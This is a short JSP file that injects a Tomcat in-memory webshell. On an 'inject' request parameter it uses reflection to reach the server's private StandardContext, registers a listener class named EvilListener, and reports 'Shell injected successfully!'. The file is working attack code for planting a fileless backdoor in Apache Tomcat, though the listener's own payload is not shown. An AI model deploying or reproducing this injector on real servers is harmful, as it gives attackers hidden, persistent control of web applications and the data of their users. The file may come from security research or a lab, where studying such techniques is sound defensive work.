<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="com.vdt.EvilListener" %>
<%
    if (request.getParameter("inject") != null) {
        try {
            // get ApplicationContextFacade obj
            ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();
            // access the private ApplicationContext field using reflection
            Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
            appCtxFacadeField.setAccessible(true);

            // get ApplicationContext obj
            ApplicationContext ctx2 = (ApplicationContext) appCtxFacadeField.get(ctx1);
            // access the private StandardContext field using reflection
            Field appCtxField = ApplicationContext.class.getDeclaredField("context");
            appCtxField.setAccessible(true);

            // get StandardContext obj
            StandardContext ctx3 = (StandardContext) appCtxField.get(ctx2);

            // add EvilListener
            ctx3.addApplicationEventListener(new EvilListener());
            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>